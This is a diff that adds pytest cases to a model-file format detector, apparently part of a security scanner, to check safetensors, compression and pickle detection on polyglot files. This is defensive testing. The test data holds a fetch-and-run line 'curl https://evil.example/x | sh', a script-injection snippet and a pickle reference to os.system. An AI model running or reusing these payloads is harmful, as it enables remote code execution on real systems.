@@ -712,6 +712,96 @@ def test_detect_protocolless_pickle_shaped_safetensors_header_remains_safetensor
     assert detect_file_format(str(safetensors_path)) == "safetensors"
 
 
+@pytest.mark.parametrize(
+    ("header_length", "magic"),
+    [(0x88B1F, b"\x1f\x8b\x08\x00"), (0x9C78, b"\x78\x9c"), (0x3754, b"T7\x00\x00")],
+    ids=["invalid-gzip", "decoder-invalid-zlib", "marker-only-torch7"],
+)
+def test_detect_valid_safetensors_framing_precedes_invalid_weak_magic(
+    tmp_path: Path,
+    header_length: int,
+    magic: bytes,
+) -> None:
+    metadata = b'{"tensor":{"dtype":"U8","shape":[1],"data_offsets":[0,1]}}'
+    metadata += b" " * (header_length - len(metadata))
+    safetensors_path = tmp_path / "weak-magic.unknown"
+    safetensors_path.write_bytes(struct.pack("<Q", header_length) + metadata + b"\x00")
+
+    assert safetensors_path.read_bytes().startswith(magic)
+    assert detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
+    assert detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"
+    assert detect_file_format(str(safetensors_path)) == "safetensors"
+
+
+def test_detect_structural_torch7_safetensors_overlap_retains_safetensors_owner(tmp_path: Path) -> None:
+    header_length = 0x3754
+    metadata = json.dumps(
+        {
+            "__metadata__": {
+                "note": (
+                    "torch.FloatTensor nn.Sequential cmd = os.execute('curl https://evil.example/x | sh') "
+                    "<script>alert(1)</script>"
+                )
+            },
+            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
+        },
+        separators=(",", ":"),
+    ).encode()
+    metadata += b" " * (header_length - len(metadata))
+    polyglot = tmp_path / "structural-torch7.unknown"
+    polyglot.write_bytes(struct.pack("<Q", header_length) + metadata + b"\x00")
+
+    assert detect_file_format_from_magic(str(polyglot)) == "safetensors"
+    assert detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"
+    assert detect_file_format(str(polyglot)) == "safetensors"
+
+
+def test_detect_preset_dictionary_zlib_safetensors_overlap_retains_compression(tmp_path: Path) -> None:
+    header_length = 0x2078
+    metadata = b'{"tensor":{"dtype":"U8","shape":[1],"data_offsets":[0,1]}}'
+    metadata += b" " * (header_length - len(metadata))
+    polyglot = tmp_path / "zlib-dictionary-candidate.unknown"
+    polyglot.write_bytes(struct.pack("<Q", header_length) + metadata + b"\x00")
+
+    assert polyglot.read_bytes()[:2] == b"\x78\x20"
+    assert detect_file_format_from_magic(str(polyglot)) == "zlib"
+    assert detect_file_format_for_skip_filter(str(polyglot)) == "zlib"
+    assert detect_file_format(str(polyglot)) == "zlib"
+
+
+def test_oversized_safetensors_compression_probe_keeps_small_bound(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    candidate = tmp_path / "oversized-bzip2-candidate.unknown"
+    prefix = b"BZh1\x00\x00\x00\x00"
+    header_length = int.from_bytes(prefix, "little")
+    with candidate.open("wb") as handle:
+        handle.write(prefix + b"{")
+        handle.truncate(8 + header_length + 1)
+
+    probe_limits: list[int] = []
+
+    def record_probe_limit(
+        _path: Path,
+        _file_size: int,
+        _compression_format: str,
+        *,
+        probe_limit: int,
+    ) -> None:
+        probe_limits.append(probe_limit)
+
+    monkeypatch.setattr(file_detection, "_probe_compression_prefix", record_probe_limit)
+
+    assert file_detection._compression_route_precedes_safetensors(
+        candidate,
+        prefix,
+        candidate.stat().st_size,
+        "bzip2",
+    )
+    assert probe_limits == [PROTO0_1_MAX_PROBE_BYTES]
+
+
 def test_detect_file_format_from_magic_json_not_misrouted_as_safetensors(tmp_path: Path) -> None:
     json_path = tmp_path / "config.unknown"
     json_path.write_text('{"name":"model","version":1}', encoding="utf-8")
@@ -2502,6 +2592,37 @@ def test_detect_file_format_probe_boundary_prefixed_proto0_pickle(tmp_path: Path
 
     assert detect_file_format(str(payload)) == "pickle"
     assert detect_file_format_from_magic(str(payload)) == "pickle"
+
+
+def test_streamed_pickle_nested_frame_uses_actual_raw_resume_offset(tmp_path: Path) -> None:
+    global_reference = b"cos\nsystem\n."
+    nominal_candidate = bytearray(b"\xff" * 80)
+    nominal_candidate[:20] = b"\x95" + struct.pack("<Q", 10) + b"\x95" + struct.pack("<Q", 3) + b"N."
+    nominal_candidate[21 : 21 + len(global_reference)] = global_reference
+
+    raw_resume_candidate = bytearray(b"\xff" * 80)
+    raw_resume_candidate[:18] = b"\x95" + struct.pack("<Q", 10) + b"\x95" + struct.pack("<Q", 4)
+    raw_resume_candidate[19:23] = b"N.\x00\x00"
+    raw_resume_candidate[23 : 23 + len(global_reference)] = global_reference
+
+    operand = b"x" * (PROTO0_1_MAX_PROBE_BYTES + 1)
+    prefix = b"B" + struct.pack("<I", len(operand)) + operand + b"0"
+    for name, candidate, expected in (
+        ("nominal", nominal_candidate, False),
+        ("raw-resume", raw_resume_candidate, True),
+    ):
+        path = tmp_path / f"nested-frame-{name}.pkl"
+        payload = prefix + candidate
+        path.write_bytes(payload)
+
+        assert (
+            file_detection._has_bounded_protocolless_binary_pickle_security_signal(
+                path,
+                len(payload),
+                payload[:16],
+            )
+            is expected
+        )
 
 
 def test_detect_file_format_trivial_probe_boundary_prefix_not_pickle(tmp_path: Path) -> None:
